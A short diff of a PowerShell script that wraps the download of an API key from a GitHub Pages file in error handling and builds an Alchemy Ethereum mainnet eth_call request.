@@ -1,6 +1,11 @@
-$apiKey = (New-Object System.Net.WebClient).DownloadString('https://hakkyahud.github.io/cantsee.txt')
-
 $command = @"
+try {
+    `$apiKey = (New-Object System.Net.WebClient).DownloadString('https://hakkyahud.github.io/cantsee.txt')
+}
+catch [System.Net.WebException] {
+  Write-Host "Couldnt not fetch"
+  return
+}
   `$url = "https://eth-mainnet.g.alchemy.com/v2/$apiKey"
   `$body = @{ jsonrpc = "2.0"
   method = "eth_call"
